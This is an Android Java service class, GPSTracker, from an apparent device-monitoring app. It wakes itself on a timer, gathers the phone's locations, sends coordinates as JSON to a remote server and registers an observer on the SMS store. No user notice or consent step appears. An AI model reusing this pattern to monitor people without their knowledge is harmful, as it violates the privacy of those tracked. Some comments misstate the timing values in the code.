package com.inet.android.location;

import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.List;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import android.annotation.SuppressLint;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.location.LocationProvider;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.preference.PreferenceManager;
import android.util.Log;

import com.inet.android.bs.MainActivity;
import com.inet.android.bs.RequestMakerImpl;
import com.inet.android.request.DataRequest;
import com.inet.android.sms.SmsSentObserver;
import com.inet.android.utils.ConvertDate;
import com.inet.android.utils.Logging;
import com.inet.android.utils.WorkTimeDefiner;

public class GPSTracker extends Service implements LocationListener {

	private static final String TAG = "locationService";
	private SmsSentObserver smsSentObserver = null;
	ConvertDate date;
	private static final int SERVICE_REQUEST_CODE = 15;
	// The minimum distance to change Updates in meters
	private static final long MIN_DISTANCE_CHANGE_FOR_UPDATES = 10; // 100
																	// meters

	// The minimum time between updates in milliseconds
	private static long MIN_TIME_BW_UPDATES = 1000 * 30 * 1; // 30 minute
	private static long MIN_TIME_BW_UPDATES1 = 1000 * 60 * 60 * 64; // 24 часа
	// Declaring a Location Manager
	protected LocationManager locationManager;

	private int timeUp = 0;
	// flag for GPS status
	boolean isGPSEnabled = false;
	SharedPreferences sp;
	// flag for network status
	boolean isNetworkEnabled = false;
	String bestProvider = null;
	// flag for GPS status
	boolean canGetLocation = false;
	private Context mContext;
	Editor e;
	Location location; // location
	double latitude; // latitude
	double longitude; // longitude
	String locMetod;
	String ID;
	String nameId;
	int minute;
	String type = "9";

	String provider;
	StringBuilder sendStrings;

	@Override
	public void onCreate() {
		Logging.doLog(TAG, "onCreate() GPS", "onCreate() GPS");
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		mContext = getApplicationContext();
		contentObserved();

		Logging.doLog(TAG, "onStartCommand gpsTracker",
				"onStartCommand gpsTracker");

		sp = PreferenceManager.getDefaultSharedPreferences(mContext);
		String gpsEnd = sp.getString("ACTION", "OK");
		MIN_TIME_BW_UPDATES = Integer.parseInt(sp.getString("GEO", "5")) * 1000 * 60;
		timeUp = Integer.parseInt(sp.getString("GEO", "5"));
		if (gpsEnd.equals("REMOVE")) {
			Logging.doLog(TAG, "REMOVE", "REMOVE");
			return 0;
		}

		Calendar cal = Calendar.getInstance();
		cal.add(Calendar.MINUTE, timeUp);// через 5 минут
		PendingIntent servicePendingIntent = PendingIntent.getService(this,
				SERVICE_REQUEST_CODE, new Intent(this, GPSTracker.class),// SERVICE_REQUEST_CODE
																			// -
																			// уникальный
																			// int
																			// сервиса
				PendingIntent.FLAG_UPDATE_CURRENT);

		AlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE);
		am.set(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(),
				servicePendingIntent);
		boolean isWork = WorkTimeDefiner.isDoWork(getApplicationContext());
		if (!isWork) {
			Logging.doLog(TAG, "isWork return " + Boolean.toString(isWork),
					"isWork return " + Boolean.toString(isWork));
			return 0;
		} else {
			Logging.doLog(TAG, Boolean.toString(isWork),
					Boolean.toString(isWork));
		}
		getLocation();
		super.onStartCommand(intent, flags, startId);
		return Service.START_STICKY;
	}

	public Location getLocation() {
		try {
			Logging.doLog(TAG, "GetLocation ", "GetLocation ");
			date = new ConvertDate();
			locationManager = (LocationManager) mContext
					.getSystemService(LOCATION_SERVICE);
			// getting GPS status
			isGPSEnabled = locationManager
					.isProviderEnabled(LocationManager.GPS_PROVIDER);
			Logging.doLog(TAG, "isGPS " + Boolean.toString(isGPSEnabled),
					"isGPS " + Boolean.toString(isGPSEnabled));

			// getting network status
			isNetworkEnabled = locationManager
					.isProviderEnabled(LocationManager.NETWORK_PROVIDER);
			Logging.doLog(TAG,
					"isNetwork " + Boolean.toString(isNetworkEnabled),
					"isNetwork " + Boolean.toString(isNetworkEnabled));

			if (!isGPSEnabled && !isNetworkEnabled) {
				// no network provider is enabled
				Logging.doLog(TAG, "!isGPS&&isNetwork ", "!isGPS&&isNetwork ");
				// sendNoLoc();
			} else {
				this.canGetLocation = true;
				getLast();
				// if GPS Enabled get lat/long using GPS Services
				if (isOnline() == true) {
					Logging.doLog(TAG, "Network isOnline ", "Network isOnline ");
					if (isNetworkEnabled == true) {
						netLoc();
					}
				}
			}
			// if (Double.toString(latitude).equals("0.0")
			// && Double.toString(longitude).equals("0.0")) {
			// Log.d(TAG, "equaels = 0.0");
			// // sendNoLoc();
			// } else
			Logging.doLog(TAG, "equaels good ", "equaels good ");
			sendLoc();

		} catch (Exception e) {
			e.printStackTrace();
		}

		return location;
	}

	// -----------------search last coordinates-----------------------

	private void getLast() {
		SimpleDateFormat TIMESTAMP = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
		Location bestResult = null;
		float accuracy;
		long time;
		long bestTime = 0;
		float bestAccuracy = 1000;
		long minTime = 0;
		List<String> matchingProviders = locationManager.getAllProviders();
		Logging.doLog(TAG, "LocMan " + matchingProviders.toString(), "LocMan "
				+ matchingProviders.toString());
		sendStrings = new StringBuilder();
		for (String provider : matchingProviders) {
			location = locationManager.getLastKnownLocation(provider);
			Logging.doLog(TAG, "last location " + provider, "last location "
					+ provider);
			if (location != null) {
				accuracy = location.getAccuracy();
				time = location.getTime();

				// Выводим Дату по шаблону
				String date2 = TIMESTAMP.format(time);
				sendStrings.append("<" + provider + ">" + "<t>" + date2
						+ "</t>" + "<a>" + accuracy + "</a>" + "<c>"
						+ location.getLatitude() + " "
						+ location.getLongitude() + "</c>" + "</" + provider
						+ ">");
				Logging.doLog(TAG, "last update " + provider + " " + date2,
						"last update " + provider + " " + date2);
				long timeSys = System.currentTimeMillis();
				minTime = timeSys - MIN_TIME_BW_UPDATES1;
				Logging.doLog(
						TAG,
						"compare " + Boolean.toString(time > minTime) + minTime,
						"compare " + Boolean.toString(time > minTime) + minTime);
				Logging.doLog(TAG, "time + accuracy " + Long.toString(time)
						+ " " + Float.toString(accuracy), "time + accuracy "
						+ Long.toString(time) + " " + Float.toString(accuracy));
				if ((time > minTime && accuracy < bestAccuracy)) {
					bestResult = location;
					bestAccuracy = accuracy;
					bestTime = time;

					// Выводим Дату по шаблону
					String date1 = TIMESTAMP.format(bestTime);
					Logging.doLog(TAG, "bestAccuracy: " + date1 + " "
							+ accuracy + " " + bestResult, "bestAccuracy: "
							+ date1 + " " + accuracy + " " + bestResult);
				} else if (time < minTime && bestAccuracy == Float.MAX_VALUE
						&& time > bestTime) {
					bestResult = location;
					bestTime = time;
					Logging.doLog(TAG, "else " + Long.toString(bestTime) + " "
							+ bestResult, "else " + Long.toString(bestTime)
							+ " " + bestResult);
				}
				// if (bestResult != null) {
				// locMetod = location.getProvider();
				// latitude = location.getLatitude();
				// longitude = location.getLongitude();
				// Log.d(TAG, "locationNet != null " + locMetod);
				//
				// }

			}

		}

	}

	public boolean isOnline() {
		ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
		NetworkInfo netInfo = cm.getActiveNetworkInfo();
		if (netInfo != null && netInfo.isConnectedOrConnecting()) {
			return true;
		}
		return false;
	}

	public void netLoc() {
		// locMetod = "network";
		locationManager.requestLocationUpdates(
				LocationManager.NETWORK_PROVIDER, 1000 * 60 * 2,
				MIN_DISTANCE_CHANGE_FOR_UPDATES, this);
		Logging.doLog(TAG, "Network netLoc", "Network netLoc");
		if (locationManager != null) {
			location = locationManager
					.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
			Logging.doLog(TAG, "locationMannet != null ",
					"locationMannet != null ");

			if (location != null) {

				latitude = location.getLatitude();
				longitude = location.getLongitude();
				Logging.doLog(TAG, "locationNet != null ",
						"locationNet != null ");

			}
		}
	}

	public void sendLoc() {
		if (Double.toString(latitude).equals("0.0")
				&& Double.toString(longitude).equals("0.0")) {
			Logging.doLog(TAG, "equals = 0.0", "equals = 0.0");
			// sendNoLoc();
		} else {

			// -------send sms----------------------------
			String sendJSONStr = null;
			JSONObject jsonObject = new JSONObject();
			JSONArray data = new JSONArray();
			JSONObject info = new JSONObject();
			JSONObject object = new JSONObject();
			try {

				info.put("ttl", locMetod);
				info.put("data", latitude + "," + longitude);

				object.put("time", date.logTime());
				object.put("type", type);
				object.put("info", info);
				data.put(object);
				jsonObject.put("data", data);
				sendJSONStr = data.toString();
			} catch (JSONException e) {
				Logging.doLog(TAG, "json сломался", "json сломался");
			}

			DataRequest dr = new DataRequest(mContext);
			dr.sendRequest(sendJSONStr);

			Logging.doLog(TAG, sendJSONStr, sendJSONStr);
			Logging.doLog(TAG, sendJSONStr);

		}
	}

	public void sendNoLoc() {

		Logging.doLog(TAG, "No location", "No location");
	}

	/**
	 * Function to get latitude
	 * */
	public double getLatitude() {
		if (location != null) {
			latitude = location.getLatitude();
		}

		// return latitude
		return latitude;
	}

	/**
	 * Function to get longitude
	 * */
	public double getLongitude() {
		if (location != null) {
			longitude = location.getLongitude();
		}

		// return longitude
		return longitude;
	}

	/**
	 * Function to check GPS/wifi enabled
	 * 
	 * @return boolean
	 * */
	public boolean canGetLocation() {
		return this.canGetLocation;
	}

	/**
	 * Function to show settings alert dialog On pressing Settings button will
	 * lauch Settings Options
	 * */

	@Override
	public void onLocationChanged(Location location) {
		if (location != null) {
			Logging.doLog(TAG, "loc change = network", "loc change = network");
			locMetod = "network";
			latitude = location.getLatitude();
			longitude = location.getLongitude();

		}
	}

	@Override
	public void onProviderDisabled(String provider) {
	}

	@Override
	public void onProviderEnabled(String provider) {
	}

	@Override
	public void onStatusChanged(String provider, int status, Bundle extras) {
		/* This is called when the GPS status alters */
		switch (status) {
		case LocationProvider.OUT_OF_SERVICE:
			Logging.doLog(TAG, "Status Changed: Out of Service", "Status Changed: Out of Service");

			break;
		case LocationProvider.TEMPORARILY_UNAVAILABLE:
			Logging.doLog(TAG,"Status Changed: Temporarily Unavailable", "Status Changed: Temporarily Unavailable");

			break;
		case LocationProvider.AVAILABLE:
			Logging.doLog(TAG, "Status Changed: Available", "Status Changed: Available");

			break;
		}
	}

	@Override
	public IBinder onBind(Intent arg0) {
		return null;
	}

	public void contentObserved() {
		if (smsSentObserver == null) {
			smsSentObserver = new SmsSentObserver(new Handler(), mContext);
			mContext.getContentResolver().registerContentObserver(
					Uri.parse("content://sms"), true, smsSentObserver);
		}
	}
}
